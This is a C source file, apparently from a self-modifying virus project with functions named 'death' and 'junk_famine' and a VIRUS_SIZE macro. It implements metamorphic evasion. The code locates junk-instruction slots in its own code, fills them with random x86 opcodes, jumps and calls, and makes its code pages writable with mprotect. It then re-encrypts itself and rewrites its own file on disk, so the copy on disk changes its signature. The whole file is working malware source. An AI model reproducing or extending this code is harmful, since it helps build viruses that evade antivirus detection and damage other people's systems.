#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

#include "utils.h"
#include "death.h"
#include "data.h"
#include "syscall.h"

extern void __attribute__((naked)) _start(void);
extern void end(void);
extern int64_t g_key;

#define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start

int __attribute__((section(".text#"))) g_junk_offsets[NB_JUNK_MAX] = {0};
size_t __attribute__((section(".text#"))) g_nb_junk = 0;
uint8_t __attribute__((section(".text#"))) g_rand[RAND_SIZE] = {0};
uint16_t __attribute__((section(".text#"))) g_ri = 0;

void junk_death(void);
void junk_famine(void);
void junk_war(void);
void junk_pestilence(void);

void junk_death(void) {
	char a;
	char b;
	char c;

	a = 1; 
	b = 2;
	c = 3;

	for (int i = 0; i < 100; i++) {
		a += b;
		b += c;
		c += a;
		if (a > b) {
			a = b;
		} else if (b > c) {
			b = c;
		} else if (c > a) {
			c = a;
		}
	}
}

static inline uint8_t ft_nrand(void) {
	uint8_t rand = g_rand[g_ri];
	g_ri = (g_ri + 1 < RAND_SIZE) ? g_ri + 1 : 0;
	return rand;
}

static int find_pattern(uint8_t *self, size_t offset) {
	if (self[offset] != PUSH_OP || self[offset + 1] != PUSH_RBX) {
		return 0;
	}

	offset += 2;

	for (size_t i = 0; i < NOPS_LEN; i += 3) {
		if (self[offset] != OP_64 || self[offset + 1] != XCHG || self[offset + 2] != RAX_RAX) {
			return 0;
		}
		offset += 3;
	}

	return (self[offset] == POP_RBX && self[offset + 1] == POP_OP);
}

static void fill_offsets(uint8_t *self, size_t size, int *junk_offsets) {

	int j = 0;
	for (size_t i = 0; i < size - JUNK_LEN; i++) {
		if (find_pattern(self, i) && j < NB_JUNK_MAX) {
			junk_offsets[j] = i;
			j++;
			i += JUNK_LEN;
		}
	}
	g_nb_junk = j;
}

static uint8_t get_random_opcode(uint8_t rand) {
	const uint8_t opcodes[] = {
		OPCODE_XCHG,
		OPCODE_MOV,
		//OPCODE_MOVSX, danger
		OPCODE_ADD_RM_R,
		OPCODE_ADD_R_RM,
		OPCODE_SUB_RM_R,
		OPCODE_SUB_R_RM,
		OPCODE_ADC,
		OPCODE_SBB,
		OPCODE_AND,
		OPCODE_OR,
		OPCODE_XOR,
		OPCODE_TEST,
		OPCODE_CMP,

		OPCODE_SHL,
	};

	return opcodes[rand % (sizeof(opcodes) / sizeof(opcodes[0]))];
}

/* patch_jmp: patch the jmp instruction with a random offset
 * example: we have an array of instructions_offsets = {0, 2, 4, 6, 8}
 * lets say the jmp instruction is at index 1 so instr_off[jmp_index] = 2
 * we patch randomly the jump to go to one of the next instructions
 * in this example jmp can jmp {0, 2, 4} (jmp 0 means it will jmp to the next instruction)
 */

static void patch_jmp(uint8_t *nop, uint8_t *instr_off, uint8_t instr_len, int8_t jmp_index) {

	int dest_i = ft_nrand() % (instr_len + 1);

	if (dest_i < instr_len) {
		*nop = (uint8_t)(instr_off[dest_i] - jmp_index - 2);
	} else {
		return;
	}
}

/* fill_nop: fill the nop array with random instructions 
 * nop: the array to fill
 * reg_1 and reg_2: the registers to use
 * file_off: the offset in the file relative to the start of the virus
 * instr_off: the array of offsets of the instructions
 * bytes_len: the number of bytes to fill
 */

static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {

	uint8_t nop_size = NOPS_LEN;
	uint8_t bytes_len = 0;

	uint8_t offset = 0;
	uint8_t instr_off[MAX_INSTR];
	uint8_t instr_count = 0;

	int8_t jmp_index = -1;

	bool lea_flag = false;

	while (nop_size > 0) {
		bytes_len = (ft_nrand() % 4) + 2;
		//bytes_len = 4;

		if (nop_size < bytes_len) {
			bytes_len = nop_size;
		}

		if (bytes_len == 0) {
			break;
		}

		switch (bytes_len) {

			case 1:
				nop[offset] = 0x90;
				break;

			case 2:
				if (jmp_index == -1 && ft_nrand() % 2 == 0) {
					nop[offset] = 0xEB;
					nop[offset + 1] = 0x00;
					jmp_index = instr_count;
				} else {
					nop[offset] = get_random_opcode(ft_nrand());
					nop[offset + 1] = 0xC0 | reg_2 | (reg_1 << 3);
				}
				break;

			case 3:
				nop[offset] = 0x48;
				nop[offset + 1] = get_random_opcode(ft_nrand());
				nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
				break;

			case 4:
				if (!lea_flag) {
					nop[offset] = 0x48;
					nop[offset + 1] = 0x8D;
					nop[offset + 2] = 0x40 | (reg_1 << 3) | reg_2;
					nop[offset + 3] = ft_nrand();
					lea_flag = true;
					break;
				} else {
					nop[offset] = 0x48;
					nop[offset + 1] = 0x83;
					nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
					nop[offset + 3] = ft_nrand();
					break;
				}
				break;

			case 5: 
				{
					nop[offset] = 0xE8;
					void (*tab[])(void) = {junk_death, junk_famine, junk_war, junk_pestilence};
					int size = sizeof(tab) / sizeof(tab[0]);

					int32_t rel_offset = (int32_t)((uintptr_t)tab[ft_nrand() % size]  - (uintptr_t)_start);
					rel_offset = rel_offset - (file_off + 0x7 + offset);
					ft_memcpy(nop + offset + 1, &rel_offset, sizeof(int32_t));
				}
				break;

			default:
				break;
		}

		instr_off[instr_count++] = offset;
		offset += bytes_len;
		nop_size -= bytes_len;

	}

	/* prepare the jmp patch */

	instr_off[instr_count++] = NOPS_LEN;

	if (jmp_index != -1) {
		uint8_t *jmp_val = nop + instr_off[jmp_index] + 1;

		if (jmp_index + 1 < instr_count) {
			patch_jmp(jmp_val, &instr_off[jmp_index + 1], instr_count - jmp_index - 1, instr_off[jmp_index]);
		}
	}
}

static void gen_junk(uint8_t *rdm_junk, int file_off) {

	uint8_t reg_1 = 4;
	uint8_t reg_2 = 4;

	/* check is rsp */
	while (reg_1 == 4) reg_1 = ft_nrand() % 8;
	while (reg_2 == 4 || reg_2 == reg_1) reg_2 = ft_nrand() % 8;

	if ((reg_1 == 4) || (reg_2 == 4) || (reg_1 == reg_2)) {
		reg_1 = 0;
		reg_2 = 1;
	}

	JUNK;

	rdm_junk[0] = PUSH_OP + reg_1;
	rdm_junk[1] = PUSH_OP + reg_2;

	fill_nop(rdm_junk + 2, reg_1, reg_2, file_off);

	rdm_junk[JUNK_LEN - 2] = POP_OP + reg_2;
	rdm_junk[JUNK_LEN - 1] = POP_OP + reg_1;

	JUNK;
}

#ifdef DEBUG
//static void print_junk_offsets(void) {
//	for (size_t i = 0; i < g_nb_junk; i++) {
//		_printf(STR("g_junk_offsets[%d]: %d\n"), i, g_junk_offsets[i]);
//	}
//}
#endif

static void replace_nop(uint8_t *self, int *junk_offsets) {

	//print_junk_offsets();

	for (size_t i = 0; i < g_nb_junk; i++) {

		uint8_t rdm_junk[JUNK_LEN];

		gen_junk(rdm_junk, junk_offsets[i]);

		ft_memcpy(self + junk_offsets[i], rdm_junk, JUNK_LEN);

	}
}

static int make_writeable(uint8_t *self, size_t size) {
	uintptr_t start = (uintptr_t)self;
	uintptr_t end = start + size;

	JUNK;

	uintptr_t page_start = start & ~(PAGE_SIZE - 1);
	uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);

	if (mprotect((void *)page_start, page_end - page_start, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
		return -1;
	}
	return 0;
}

void prepare_mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	make_writeable((uint8_t *)start, VIRUS_SIZE);

	getrandom(g_rand, RAND_SIZE, 0);

	JUNK;

	if (g_junk_offsets[0] != 0)
		return;

	fill_offsets((uint8_t *)start, VIRUS_SIZE, g_junk_offsets);
}

void mutate(void) {

	uintptr_t start = (uintptr_t)&_start;

	replace_nop((uint8_t *)start, g_junk_offsets);

	JUNK;
}

static void write_self_pos(uint8_t *entry) {

	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
	uint8_t *junk = (uint8_t *)(entry + junk_pos);
	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));

	uintptr_t junk_size = (uintptr_t)&g_nb_junk - (uintptr_t)&_start;
	uint8_t *size = (uint8_t *)(entry + junk_size);
	ft_memcpy(size, &g_nb_junk, sizeof(g_nb_junk));
}

int death(int start_offset, int64_t key, file_t *file) { JUNK;

	uint8_t *self = (uint8_t *)file->view.data; JUNK;
	char *self_name = file->abs_path;
	int fd = -1;
	bool is_encrypted = (start_offset != 0x1000) ? true : false;

	uint8_t *entry = self + start_offset;

	if (is_encrypted) {
		encrypt(entry, VIRUS_SIZE, key);
		replace_nop(entry, g_junk_offsets);
	} else {
		write_self_pos(entry);
		replace_nop(entry, g_junk_offsets);
	}

	if (is_encrypted) {
		encrypt(entry, VIRUS_SIZE, key);
	}

	if (unlink(self_name) == -1) {
		munmap(self, file->view.size);
		return -1;
	} JUNK;

	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
	if (fd == -1)
		return -1;


	if (write(fd, self, file->view.size) == -1) {
		close(fd);
		munmap(self, file->view.size);
		return -1;
	} JUNK;

	if (munmap(self, file->view.size) == -1) {
		close(fd);
		return -1;
	}

	close(fd);

	return 0;
}
